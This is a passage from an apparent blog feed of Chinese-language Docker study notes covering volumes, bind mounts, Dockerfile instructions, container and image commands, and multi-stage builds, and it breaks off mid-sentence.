        <content type="html"><![CDATA[<p>数据挂载<br><a href="https://yeasy.gitbooks.io/docker_practice/data_management/volume.html" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/data_management/volume.html</a></p><h4 id="数据卷"><a href="#数据卷" class="headerlink" title="数据卷"></a>数据卷</h4><p>数据卷 是一个可供一个或多个容器使用的特殊目录，它绕过 UFS，可以提供很多有用的特性：</p><ul><li>数据卷 可以在容器之间共享和重用</li><li>对 数据卷 的修改会立马生效</li><li>对 数据卷 的更新，不会影响镜像</li><li>数据卷 默认会一直存在，即使容器被删除</li></ul><p>注意：数据卷 的使用，类似于 Linux 下对目录或文件进行 mount，镜像中的被指定为挂载点的目录中的文件会隐藏掉，能显示看的是挂载的 数据卷。</p><blockquote><p>创建一个数据卷</p></blockquote><pre><code>$ docker volume create my-vol</code></pre><blockquote><p>查看所有的 数据卷</p></blockquote><pre><code>$ docker volume ls</code></pre><blockquote><p>在主机里使用以下命令可以查看指定 数据卷 的信息</p></blockquote><pre><code>$ docker volume inspect my-vol</code></pre><blockquote><p>启动一个挂载数据卷的容器</p></blockquote><p>在用 docker run 命令的时候，使用 –mount 标记来将 数据卷 挂载到容器里。在一次 docker run 中可以挂载多个 数据卷。</p><pre><code>下面创建一个名为 web 的容器，并加载一个 数据卷 到容器的 /webapp 目录。$ docker run -d -P \    --name web \    # -v my-vol:/wepapp \    --mount source=my-vol,target=/webapp \    training/webapp \    python app.py</code></pre><blockquote><p>查看数据卷的具体信息</p></blockquote><pre><code>在主机里使用以下命令可以查看 web 容器的信息$ docker inspect web数据卷 信息在 &quot;Mounts&quot; Key 下面&quot;Mounts&quot;: [    {        &quot;Type&quot;: &quot;volume&quot;,        &quot;Name&quot;: &quot;my-vol&quot;,        &quot;Source&quot;: &quot;/var/lib/docker/volumes/my-vol/_data&quot;,        &quot;Destination&quot;: &quot;/app&quot;,        &quot;Driver&quot;: &quot;local&quot;,        &quot;Mode&quot;: &quot;&quot;,        &quot;RW&quot;: true,        &quot;Propagation&quot;: &quot;&quot;    }],</code></pre><blockquote><p>删除数据卷</p></blockquote><pre><code>$ docker volume rm my-vol</code></pre><p>数据卷 是被设计用来持久化数据的，它的生命周期独立于容器，Docker 不会在容器被删除后自动删除 数据卷，<br>并且也不存在垃圾回收这样的机制来处理没有任何容器引用的 数据卷。<br>如果需要在删除容器的同时移除数据卷。可以在删除容器的时候使用 docker rm -v 这个命令。</p><p>无主的数据卷可能会占据很多空间，要清理请使用以下命令</p><pre><code>$ docker volume prune</code></pre><h4 id="挂载主机目录"><a href="#挂载主机目录" class="headerlink" title="挂载主机目录"></a>挂载主机目录</h4><blockquote><p>挂载一个主机目录作为数据卷</p></blockquote><p>使用 –mount 标记可以指定挂载一个本地主机的目录到容器中去。</p><pre><code>$ docker run -d -P \    --name web \    # -v /src/webapp:/opt/webapp \    --mount type=bind,source=/src/webapp,target=/opt/webapp \    training/webapp \    python app.py</code></pre><p>上面的命令加载主机的 /src/webapp 目录到容器的 /opt/webapp目录。<br>这个功能在进行测试的时候十分方便，比如用户可以放置一些程序到本地目录中，来查看容器是否正常工作。<br>本地目录的路径必须是绝对路径，以前使用 -v 参数时如果本地目录不存在 Docker 会自动为你创建一个文件夹，<br>现在使用 –mount 参数时如果本地目录不存在，Docker 会报错。</p><blockquote><p>Docker 挂载主机目录的默认权限是 读写，用户也可以通过增加 readonly 指定为 只读。</p></blockquote><pre><code>$ docker run -d -P \    --name web \    # -v /src/webapp:/opt/webapp:ro \    --mount type=bind,source=/src/webapp,target=/opt/webapp,readonly \    training/webapp \    python app.py</code></pre><p>加了 readonly 之后，就挂载为 只读 了。如果你在容器内 /opt/webapp 目录新建文件，会显示如下错误</p><p>/opt/webapp # touch new.txt<br>touch: new.txt: Read-only file system</p><blockquote><p>查看数据卷的具体信息</p></blockquote><p>在主机里使用以下命令可以查看 web 容器的信息</p><pre><code>$ docker inspect web挂载主机目录 的配置信息在 &quot;Mounts&quot; Key 下面&quot;Mounts&quot;: [    {        &quot;Type&quot;: &quot;bind&quot;,        &quot;Source&quot;: &quot;/src/webapp&quot;,        &quot;Destination&quot;: &quot;/opt/webapp&quot;,        &quot;Mode&quot;: &quot;&quot;,        &quot;RW&quot;: true,        &quot;Propagation&quot;: &quot;rprivate&quot;    }],</code></pre><blockquote><p>挂载一个本地主机文件作为数据卷</p></blockquote><p>–mount 标记也可以从主机挂载单个文件到容器中</p><pre><code>$ docker run --rm -it \   # -v $HOME/.bash_history:/root/.bash_history \   --mount type=bind,source=$HOME/.bash_history,target=/root/.bash_history \   ubuntu:18.04 \   bashroot@2affd44b4667:/# history1  ls2  diskutil list这样就可以记录在容器输入过的命令了。</code></pre>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker dockerfile.md</title>
      <link href="/2019/12/02/deploy/server/docker/docker%20dockerfile/"/>
      <url>/2019/12/02/deploy/server/docker/docker%20dockerfile/</url>
      
        <content type="html"><![CDATA[<p>参考：<br><a href="https://yeasy.gitbooks.io/docker_practice/" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/</a></p><p>包括：<br>FROM、MAINTAINER、RUN、ENV、COPY、ADD、EXPOSE、CMD、<br>ENTRYPORINT、VOLUME、USER、WORKDIR、ONBUILD、LABEL、<br>STOPSIGNAL、HEALTHCHECK、SHELL</p><hr><p>示例</p><pre><code># docker fileMAINTAINER zhuzhenyuan&lt;zhenyuanzhu@outlook.com&gt;FROM node:8.4COPY . /appWORKDIR /appRUN npm install --registry=https://registry.npm.taobao.orgEXPOSE 3000CMD node demos/01.js# 说明From node:8.4 : 该image继承自官方的node image,冒号表示标签,这里表示8.4,即8.4版本的node.COPY . /app :将当前目录下的所有文件都拷贝到image文件的 /app 目录.WORKDIR /app : 指定接下来的工作目录为 /app .RUN npm install：在/app目录下，运行npm install命令安装依赖。注意，安装后所有的依赖，都将打包进入 image 文件。EXPOSE 3000 : 将容器的3000 端口暴露出来,允许外部连接这个端口.</code></pre><blockquote><p>USER 指定当前用户</p></blockquote><pre><code>格式：USER &lt;用户名&gt;[:&lt;用户组&gt;]USER 指令和 WORKDIR 相似，都是改变环境状态并影响以后的层。WORKDIR 是改变工作目录，USER 则是改变之后层的执行 RUN, CMD 以及 ENTRYPOINT 这类命令的身份。当然，和 WORKDIR 一样，USER 只是帮助你切换到指定用户而已，这个用户必须是事先建立好的，否则无法切换。示例：RUN groupadd -r redis &amp;&amp; useradd -r -g redis redisUSER redisRUN [ &quot;redis-server&quot; ]如果以 root 执行的脚本，在执行期间希望改变身份，比如希望以某个已经建立好的用户来运行某个服务进程，不要使用 su 或者 sudo，这些都需要比较麻烦的配置，而且在 TTY 缺失的环境下经常出错。建议使用 gosu</code></pre><blockquote><p>FROM</p></blockquote><pre><code>FROM 指令用于设置在新映像创建过程期间将使用的容器映像。格式：FROM 示例：FROM nginxFROM microsoft/dotnet:2.1-aspnetcore-runtime</code></pre><blockquote><p>RUN</p></blockquote><pre><code>RUN 指令指定将要运行并捕获到新容器映像中的命令。 这些命令包括安装软件、创建文件和目录，以及创建环境配置等。格式：RUN [&quot;&quot;, &quot;&quot;, &quot;&quot;]RUN cmd示例：RUN apt-get updateRUN mkdir -p /usr/src/redisRUN apt-get update &amp;&amp; apt-get install -y libgdiplusRUN [&quot;apt-get&quot;,&quot;install&quot;,&quot;-y&quot;,&quot;nginx&quot;]# 注意：每一个指令都会创建一层，并构成新的镜像。# 当运行多个RUN指令时，会产生一些非常臃肿、非常多层的镜像，不仅仅增加了构建部署的时间，也很容易出错。# 因此，在很多情况下，我们可以合并指令并运行，# 例如：RUN apt-get update &amp;&amp; apt-get install -y libgdiplus。# 在命令过多时，一定要注意格式，比如换行、缩进、注释等，会让维护、排障更为容易，这是一个比较好的习惯。# 使用换行符时，可能会遇到一些问题，具体可以参阅下节的转义字符。</code></pre><blockquote><p>COPY</p></blockquote><pre><code>COPY 指令将文件和目录复制到容器的文件系统。文件和目录需位于相对于 Dockerfile 的路径中。格式：COPY &lt;源路径&gt; &lt;目标路径&gt;如果源或目标包含空格，请将路径括在方括号和双引号中。COPY [&quot;&quot;, &quot;&quot;]示例：COPY . .COPY nginx.conf /etc/nginx/nginx.confCOPY . /usr/share/nginx/htmlCOPY hom* /mydir/</code></pre><blockquote><p>ADD不推荐使用</p></blockquote><pre><code>ADD 指令与 COPY 指令非常类似，但它包含更多功能。除了将文件从主机复制到容器映像，ADD 指令还可以使用 URL 规范从远程位置复制文件。如果 &lt;源路径&gt; 为一个 tar 压缩文件的话，压缩格式为 gzip, bzip2 以及 xz 的情况下，ADD 指令将会自动解压缩这个压缩文件到 &lt;目标路径&gt; 去。格式：ADD &lt;source&gt; &lt;destination&gt;示例：ADD https://www.python.org/ftp/python/3.5.1/python-3.5.1.exe /temp/python-3.5.1.exeADD Itaest.tar.gz /var/www/此示例会将 Python for Windows下载到容器映像的 c:\temp 目录。ADD 指令会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢。因此在 COPY 和 ADD 指令中选择的时候，可以遵循这样的原则，所有的文件复制均使用 COPY 指令，仅在需要自动解压缩的场合使用 ADD</code></pre><blockquote><p>WORKDIR</p></blockquote><pre><code>WORKDIR 指令用于为其他 Dockerfile 指令（如 RUN、CMD）设置一个工作目录，并且还设置用于运行容器映像实例的工作目录。格式：WORKDIR示例：WORKDIR /app格式为 WORKDIR &lt;工作目录路径&gt;。使用 WORKDIR 指令可以来指定工作目录（或者称为当前目录），以后各层的当前目录就被改为指定的目录，如该目录不存在，WORKDIR 会帮你建立目录。</code></pre><blockquote><p>CMD</p></blockquote><pre><code>CMD指令用于设置部署容器映像的实例时要运行的默认命令。例如，如果该容器将承载 NGINX Web 服务器，则 CMD 可能包括用于启动Web服务器的指令，如 nginx.exe。 如果 Dockerfile 中指定了多个CMD 指令，只会计算最后一个指令。在运行时可以指定新的命令来替代镜像设置中的这个默认命令，run的时候格式：CMD [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;...]CMD &lt;命令&gt;参数列表格式：CMD [&quot;参数1&quot;, &quot;参数2&quot;...]。在指定了 ENTRYPOINT 指令后，用 CMD 指定具体的参数示例：CMD [&quot;c:\\Apache24\\bin\\httpd.exe&quot;, &quot;-w&quot;]CMD c:\\Apache24\\bin\\httpd.exe -w</code></pre><blockquote><p>ENTRYPOINT</p></blockquote><pre><code>配置容器启动后执行的命令，并且不可被 docker run 提供的参数覆盖。每个 Dockerfile 中只能有一个ENTRYPOINT，当指定多个时，只有最后一个起效。ENTRYPOINT 的目的和 CMD 一样，都是在指定容器启动程序及参数。ENTRYPOINT 在运行时也可以替代，不过比 CMD 要略显繁琐，需要通过 docker run 的参数 --entrypoint 来指定。当指定了 ENTRYPOINT 后，CMD 的含义就发生了改变，不再是直接的运行其命令，而是将 CMD 的内容作为参数传给 ENTRYPOINT 指令，换句话说实际执行时，将变为：&lt;ENTRYPOINT&gt; &quot;&lt;CMD&gt;&quot;格式：ENTRYPOINT [&quot;&quot;, &quot;&quot;]示例：ENTRYPOINT [&quot;dotnet&quot;, &quot;Magicodes.Admin.Web.Host.dll&quot;]总结：一般还是会用entrypoint的中括号形式作为docker 容器启动以后的默认执行命令，里面放的是不变的部分，可变部分比如命令参数可以使用cmd的形式提供默认版本，也就是run里面没有任何参数时使用的默认参数。如果我们想用默认参数，就直接run，否则想用其他参数，就run 里面加参数。</code></pre><blockquote><p>ENV</p></blockquote><pre><code>ENV命令用于设置环境变量。这些变量以”key=value”的形式存在，并可以在容器内被脚本或者程序调用。这个机制给在容器中运行应用带来了极大的便利。格式：ENV &lt;key&gt; &lt;value&gt;ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...示例：ENV VERSION=1.0 DEBUG=on \NAME=&quot;Happy Feet&quot;</code></pre><blockquote><p>ARG 构建参数</p></blockquote><pre><code>格式：ARG &lt;参数名&gt;[=&lt;默认值&gt;]构建参数和 ENV 的效果一样，都是设置环境变量。所不同的是，ARG 所设置的构建环境的环境变量，在将来容器运行时是不会存在这些环境变量的。但是不要因此就使用 ARG 保存密码之类的信息，因为 docker history 还是可以看到所有值的。Dockerfile 中的 ARG 指令是定义参数名称，以及定义其默认值。该默认值可以在构建命令 docker build 中用 --build-arg &lt;参数名&gt;=&lt;值&gt; 来覆盖。在 1.13 之前的版本，要求 --build-arg 中的参数名，必须在 Dockerfile 中用 ARG 定义过了，换句话说，就是 --build-arg 指定的参数，必须在 Dockerfile 中使用了。如果对应参数没有被使用，则会报错退出构建。从 1.13 开始，这种严格的限制被放开，不再报错退出，而是显示警告信息，并继续构建。这对于使用 CI 系统，用同样的构建流程构建不同的 Dockerfile 的时候比较有帮助，避免构建命令必须根据每个 Dockerfile 的内容修改。</code></pre><blockquote><p>EXPOSE</p></blockquote><pre><code>EXPOSE用来指定端口，使容器内的应用可以通过端口和外界交互。（可以写多个）格式：EXPOSE示例：EXPOSE 80格式为 EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]。EXPOSE 指令是声明运行时容器提供服务端口，这只是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务。在 Dockerfile 中写入这样的声明有两个好处，一个是帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射；另一个用处则是在运行时使用随机端口映射时，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口。要将 EXPOSE 和在运行时使用 -p &lt;宿主端口&gt;:&lt;容器端口&gt; 区分开来。-p，是映射宿主端口和容器端口，换句话说，就是将容器的对应端口服务公开给外界访问，而 EXPOSE 仅仅是声明容器打算使用什么端口而已，并不会自动在宿主进行端口映射。</code></pre><blockquote><p>MAINTAINER</p></blockquote><pre><code>设置维护者信息格式：MAINTAINER Name &lt;Email&gt;</code></pre><blockquote><p>VOLUME</p></blockquote><pre><code>基于镜像创建容器添加数据卷，即在容器中设置一个挂载点，可以让其他容器挂载或让宿主机访问，以实现数据共享或对容器数据的备份、恢复或迁移格式：VOLUME [&quot;/data&quot;, &quot;/data2&quot;]VOLUME /data说明：之前我们说过，容器运行时应该尽量保持容器存储层不发生写操作，对于数据库类需要保存动态数据的应用，其数据库文件应该保存于卷(volume)中，为了防止运行时用户忘记将动态文件所保存目录挂载为卷，在 Dockerfile 中，我们可以事先指定某些目录挂载为匿名卷，这样在运行时如果用户不指定挂载，其应用也可以正常运行，不会向容器存储层写入大量数据。VOLUME /data这里的 /data 目录就会在运行时自动挂载为匿名卷，任何向 /data 中写入的信息都不会记录进容器存储层，从而保证了容器存储层的无状态化。当然，运行时可以覆盖这个挂载设置。比如：docker run -d -v mydata:/data xxxx在这行命令中，就使用了 mydata 这个命名卷挂载到了 /data 这个位置，替代了 Dockerfile 中定义的匿名卷的挂载配置。</code></pre><blockquote><p>转义字符</p></blockquote><pre><code>在许多情况下，Dockerfile 指令需要跨多个行；这可通过转义字符完成。默认 Dockerfile 转义字符是反斜杠 \。 由于反斜杠在 Windows 中也是一个文件路径分隔符，这可能导致出现问题。要修改转义字符，必须在 Dockerfile 最开始的行上放置一个转义分析程序指令。 如以下示例所示：# escape=`注意，只有两个值可用作转义字符：\ 和 ` 。</code></pre><blockquote><p>HEALTHCHECK 健康检查</p></blockquote><pre><code>格式：HEALTHCHECK [选项] CMD &lt;命令&gt;：设置检查容器健康状况的命令HEALTHCHECK NONE：如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令HEALTHCHECK 指令是告诉 Docker 应该如何进行判断容器的状态是否正常，这是 Docker 1.12 引入的新指令。在没有 HEALTHCHECK 指令前，Docker 引擎只可以通过容器内主进程是否退出来判断容器是否状态异常。很多情况下这没问题，但是如果程序进入死锁状态，或者死循环状态，应用进程并不退出，但是该容器已经无法提供服务了。在 1.12 以前，Docker 不会检测到容器的这种状态，从而不会重新调度，导致可能会有部分容器已经无法提供服务了却还在接受用户请求。而自 1.12 之后，Docker 提供了 HEALTHCHECK 指令，通过该指令指定一行命令，用这行命令来判断容器主进程的服务状态是否还正常，从而比较真实的反应容器实际状态。当在一个镜像指定了 HEALTHCHECK 指令后，用其启动容器，初始状态会为 starting，在 HEALTHCHECK 指令检查成功后变为 healthy，如果连续一定次数失败，则会变为 unhealthy。HEALTHCHECK 支持下列选项：--interval=&lt;间隔&gt;：两次健康检查的间隔，默认为 30 秒；--timeout=&lt;时长&gt;：健康检查命令运行超时时间，如果超过这个时间，本次健康检查就被视为失败，默认 30 秒；--retries=&lt;次数&gt;：当连续失败指定次数后，则将容器状态视为 unhealthy，默认 3 次。和 CMD, ENTRYPOINT 一样，HEALTHCHECK 只可以出现一次，如果写了多个，只有最后一个生效。在 HEALTHCHECK [选项] CMD 后面的命令，格式和 ENTRYPOINT 一样，分为 shell 格式，和 exec 格式。命令的返回值决定了该次健康检查的成功与否：0：成功；1：失败；2：保留，不要使用这个值。假设我们有个镜像是个最简单的 Web 服务，我们希望增加健康检查来判断其 Web 服务是否在正常工作，我们可以用 curl 来帮助判断，其 Dockerfile 的 HEALTHCHECK 可以这么写：FROM nginxRUN apt-get update &amp;&amp; apt-get install -y curl &amp;&amp; rm -rf /var/lib/apt/lists/*HEALTHCHECK --interval=5s --timeout=3s \  CMD curl -fs http://localhost/ || exit 1这里我们设置了每 5 秒检查一次（这里为了试验所以间隔非常短，实际应该相对较长），如果健康检查命令超过 3 秒没响应就视为失败，并且使用 curl -fs http://localhost/ || exit 1 作为健康检查命令。使用 docker build 来构建这个镜像：$ docker build -t myweb:v1 .构建好了后，我们启动一个容器：$ docker run -d --name web -p 80:80 myweb:v1当运行该镜像后，可以通过 docker container ls 看到最初的状态为 (health: starting)：$ docker container lsCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                            PORTS               NAMES03e28eb00bd0        myweb:v1            &quot;nginx -g &#39;daemon off&quot;   3 seconds ago       Up 2 seconds (health: starting)   80/tcp, 443/tcp     web在等待几秒钟后，再次 docker container ls，就会看到健康状态变化为了 (healthy)：$ docker container lsCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                    PORTS               NAMES03e28eb00bd0        myweb:v1            &quot;nginx -g &#39;daemon off&quot;   18 seconds ago      Up 16 seconds (healthy)   80/tcp, 443/tcp     web如果健康检查连续失败超过了重试次数，状态就会变为 (unhealthy)。为了帮助排障，健康检查命令的输出（包括 stdout 以及 stderr）都会被存储于健康状态里，可以用 docker inspect 来查看。$ docker inspect --format &#39;{{json .State.Health}}&#39; web | python -m json.tool</code></pre><blockquote><p>ONBUILD</p></blockquote><pre><code>FROM node:slimRUN mkdir /appWORKDIR /appONBUILD COPY ./package.json /appONBUILD RUN [ &quot;npm&quot;, &quot;install&quot; ]ONBUILD COPY . /app/CMD [ &quot;npm&quot;, &quot;start&quot; ]说明：使用该指令的行，只在当前构建的镜像作为另一个镜像的基础镜像时，才会执行，自身构建不会执行参考：https://yeasy.gitbooks.io/docker_practice/image/dockerfile/onbuild.html</code></pre><p><strong>优化</strong></p><blockquote><p>下面是一些优化的准则：</p></blockquote><ul><li>选择合适的基础镜像</li></ul><p>一个合适的基础镜像是指能满足运行应用所需要的最小的镜像，理论上是能用小的就不要用大的，能用轻量的就不要用重量级的，能用性能好的就不要用性能差的。这里有时候还需要考虑那些能够减少我们构建层数的基础镜像。</p><ul><li>优化指令顺序</li></ul><p>Docker会缓存Dockerfile中尚未更改的所有步骤，但是，如果更改任何指令，将重做其后的所有步骤。也就是指令3有变动，那么4、5、6就会重做。因此，我们需要将最不可能产生更改的指令放在前面，按照这个顺序来编写dockerfile指令。这样，在构建过程中，就可以节省很多时间。比如，我们可以把WORKDIR、ENV等命令放前面，COPY、ADD放后面。</p><ul><li>合并指令</li></ul><p>前面我们说到了，每一个指令都会创建一层，并构成新的镜像。当运行多个指令时，会产生一些非常臃肿、非常多层的镜像，不仅仅增加了构建部署的时间，也很容易出错。因此，在很多情况下，我们可以合并指令并运行，</p><p>例如：RUN apt-get update &amp;&amp; apt-get install -y libgdiplus。</p><p>在命令过多时，一定要注意格式，比如换行、缩进、注释等，会让维护、排障更为容易，这是一个比较好的习惯。</p><ul><li>删除多余文件和清理没用的中间结果</li></ul><p>这点很易于理解，通常来讲，体积更小，部署更快！因此在构建过程中，我们需要清理那些最终不需要的代码或文件。比如说，临时文件、源代码、缓存等等。</p><ul><li>使用 .dockerignore</li></ul><p>.dockerignore文件用于忽略那些镜像构建时非必须的文件，这些文件可以是开发文档、日志、其他无用的文件。例如</p><p>.dockerignore</p><blockquote><p>下面的代码表示,这三个路径要排除,不要打包进image文件,如果你没有路径可以排除,这个文件也可以不用建立</p></blockquote><pre><code>.gitnode_modulesnpm-debug.log</code></pre>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker 容器操作.md</title>
      <link href="/2019/12/02/deploy/server/docker/docker%20%E5%AE%B9%E5%99%A8%E6%93%8D%E4%BD%9C/"/>
      <url>/2019/12/02/deploy/server/docker/docker%20%E5%AE%B9%E5%99%A8%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h4 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h4><p>container 容器文件, image文件生成的实例本身也是一个文件,成为容器文件<br>也即是说,一旦容器生成,就会存在两个文件:一个image文件,一个容器文件.而且关闭容器并不会删除容器文件,只是容器停止运行而已</p><blockquote><p>回到主机，但是不想容器退出</p></blockquote><pre><code>ctrl+p,ctrl+q</code></pre><blockquote><p>运行容器</p></blockquote><pre><code>docker run httpddocker container run hello-world# 输出Hello worlddocker run ubuntu:15.10 /bin/echo &quot;Hello world&quot;# 运行交互式的容器docker run -i -t ubuntu:15.10 /bin/bash# 说明-t:在新容器内指定一个伪终端或终端。-i:允许你对容器内的标准输入 (STDIN) 进行交互。ubuntu:15.10 - 使用 ubuntu 基础镜像 15.10/bin/bash - 运行命令 bash shell注: ubuntu 会有多个版本，通过指定 tag 来启动特定的版本 [image]:[tag]# 启动容器（后台模式） -ddocker run -d ubuntu:15.10 /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot;# 命令 --rm 参数,在容器终止运行后自动删除容器文件.docker container run --rm -p 8000:3000 -it koa-demo /bin/bash# 用 nginx 镜像启动一个容器，命名为 webserver，并且映射了 80 端口。docker run --name webserver -d -p 80:80 nginx</code></pre><blockquote><p>启动已终止容器</p></blockquote><pre><code>docker start docker container start ID/name # 接将一个已经终止的容器启动运行</code></pre><blockquote><p>重启容器</p></blockquote><pre><code>docker restart ID/namedocker container restart ID/name</code></pre><blockquote><p>停止容器</p></blockquote><pre><code>docker stop ID/namedocker container stop ID/name# 终止容器，直接杀死会丢失数据docker container kill [container_id]# 前面的docker container kill命令终止容器的运行,相当于向容器的主进程发送SIGKILL信号,# 而docker container stop也是用来终止容器的运行,相当于向容器的主进程发送SIGTERM信号# 然后过一段时间在发送SIGKILL信号.</code></pre><blockquote><p>移除容器</p></blockquote><pre><code>docker rm ID/namedocker container rm [container_id]如果要删除一个运行中的容器，可以添加 -f 参数。Docker 会发送 SIGKILL 信号给容器。清理所有处于终止状态的容器用 docker container ls -a 命令可以查看所有已经创建的包括终止状态的容器，如果数量太多要一个个删除可能会很麻烦，用下面的命令可以清理掉所有处于终止状态的容器。docker container prune</code></pre><blockquote><p>重命名一个容器</p></blockquote><pre><code>docker rename old_name new_name </code></pre><blockquote><p>查看正在运行的容器</p></blockquote><pre><code>docker psCONTAINER ID:容器IDNAMES:自动分配的容器名称# 查看已经启动的容器docker ps -s # 查看已经创建的容器，包括已经停止的容器docker ps -a# 查询最后一次创建的容器：docker ps -l </code></pre><blockquote><p>查看指定容器的标准输出</p></blockquote><pre><code>docker logs ID/namedocker container logs ID/name# 用来查看容器的输出,即容器里shell的标准输出.# 比如: 如果docker run命令运行容器的时候,没有使用-it参数,就要使用这个命令查看输出.</code></pre><blockquote><p>查看容器的进程</p></blockquote><pre><code>docker top ID/name</code></pre><blockquote><p>令容器执行指令</p></blockquote><pre><code>docker exec [container_id] commanddocker container exec [container_id] command# 用于进行一个正在运行的容器.如果docker container run命令运行容器的时候,# 没有使用-it参数,就要使用这个命令进入进入容器,一旦进入容器,就可以在容器的shell执行命令了.</code></pre><blockquote><p>从主机进入容器</p></blockquote><pre><code>docker exec -it 7054aa92bf8e /bin/bashexec 命令: -i -t 参数只用 -i 参数时，由于没有分配伪终端，界面没有我们熟悉的 Linux 命令提示符，但命令执行结果仍然可以返回。当 -i -t 参数一起使用时，则可以看到我们熟悉的 Linux 命令提示符。docker attach 7054aa92bf8e （回车）  # 不推荐，避免使用attach该命令有问题。1. 当多个窗口同时使用该命令进入该容器时，所有的窗口都会同步显示。如果有一个窗口阻塞了，那么其他窗口也无法再进行操作。2. 当用exit退出时，会把这个容器退出所以docker attach命令不太适合于生产环境，平时自己开发应用时可以使用该命令。</code></pre><blockquote><p>从容器中复制文件</p></blockquote><pre><code>docker cp [container_id]:[/path/to/file] .docker container cp [container_id]:[/path/to/file] .# docker container cp命令用于从正在运行的容器里,将文件拷贝到本机.下面是拷贝当前 目录的写法:</code></pre><blockquote><p>命令看到具体的改动</p></blockquote><pre><code>docker diff Id/Name</code></pre><blockquote><p>从容器拷贝文件</p></blockquote><pre><code>docker cp  02d50df3a6d1:/bin/bash .</code></pre>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker 多阶段构建.md</title>
      <link href="/2019/12/02/deploy/server/docker/docker%20%E5%A4%9A%E9%98%B6%E6%AE%B5%E6%9E%84%E5%BB%BA/"/>
      <url>/2019/12/02/deploy/server/docker/docker%20%E5%A4%9A%E9%98%B6%E6%AE%B5%E6%9E%84%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h4 id="使用多阶段构建"><a href="#使用多阶段构建" class="headerlink" title="使用多阶段构建"></a>使用多阶段构建</h4><p>为解决以上问题，Docker v17.05 开始支持多阶段构建 (multistage builds)。使用多阶段构建我们就可以很容易解决前面提到的问题，并且只需要编写一个 Dockerfile：</p><blockquote><p>例如，编写 Dockerfile 文件</p></blockquote><pre><code>FROM golang:1.9-alpine as builderRUN apk --no-cache add gitWORKDIR /go/src/github.com/go/helloworld/RUN go get -d -v github.com/go-sql-driver/mysqlCOPY app.go .RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .FROM alpine:latest as prodRUN apk --no-cache add ca-certificatesWORKDIR /root/COPY --from=0 /go/src/github.com/go/helloworld/app .CMD [&quot;./app&quot;]</code></pre><blockquote><p>构建镜像</p></blockquote><pre><code>$ docker build -t go/helloworld:3 .</code></pre><blockquote><p>只构建某一阶段的镜像</p></blockquote><p>我们可以使用 as 来为某一阶段命名，例如</p><pre><code>FROM golang:1.9-alpine as builder</code></pre><p>例如当我们只想构建 builder 阶段的镜像时，增加 –target=builder 参数即可</p><pre><code>$ docker build --target builder -t username/imagename:tag .</code></pre><blockquote><p>构建时从其他镜像复制文件</p></blockquote><p>上面例子中我们使用 COPY –from=0 /go/src/github.com/go/helloworld/app .从上一阶段的镜像中复制文件，我们也可以复制任意镜像中的文件。</p><pre><code>COPY --from=nginx:latest /etc/nginx/nginx.conf /nginx.conf</code></pre>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker compose.md</title>
      <link href="/2019/12/02/deploy/server/docker/docker%20compose/"/>
      <url>/2019/12/02/deploy/server/docker/docker%20compose/</url>
      
        <content type="html"><![CDATA[<p><a href="https://yeasy.gitbooks.io/docker_practice/compose/" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/compose/</a></p>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker 镜像操作.md</title>
      <link href="/2019/12/02/deploy/server/docker/docker%20%E9%95%9C%E5%83%8F%E6%93%8D%E4%BD%9C/"/>
      <url>/2019/12/02/deploy/server/docker/docker%20%E9%95%9C%E5%83%8F%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<pre><code>docker inspect ID/Name 查看镜像或者容器的信息信息</code></pre><h4 id="镜像操作"><a href="#镜像操作" class="headerlink" title="镜像操作"></a>镜像操作</h4><p>Docker把应用程序及其依赖打包在一个image文件里面,可以理解为一个容器的说明书. 通过这个image文件可以生成容器的实例.同一个image文件可以生成同时运行的多个实例.</p><p>image文件是一个二进制文件,实际上,一个image文件往往继承自另外一个image文件,加上一些个性化设置而成.举例来说:你可以在ubuntu的image基础上加上Apache服务器,形成你自己的image.<br>kj</p><blockquote><p>查找image</p></blockquote><pre><code>docker search ubuntu# 说明 查找镜像Docker Hub 网址为： https://hub.docker.com/NAME: 镜像仓库源的名称DESCRIPTION: 镜像的描述OFFICIAL: 是否docker官方发布</code></pre><blockquote><p>查看当前镜像列表</p></blockquote><pre><code>docker image lsdocker images# 说明REPOSITORY：表示镜像的仓库源TAG：镜像的标签IMAGE ID：镜像IDCREATED：镜像创建时间SIZE：镜像大小# 中间层镜像docker image ls -a根据仓库名列出镜像docker image ls ubuntu列出特定的某个镜像，也就是说指定仓库名和标签docker image ls ubuntu:18.04只显示iddocker image ls -qdocker image ls -q redis</code></pre><blockquote><p>获取镜像</p></blockquote><pre><code>docker pull [选项] [Docker Registry 地址[:端口号]/]仓库名[:标签]# Docker 镜像仓库地址：地址的格式一般是 &lt;域名/IP&gt;[:端口号]。默认地址是 Docker Hub。# 仓库名：如之前所说，这里的仓库名是两段式名称，即 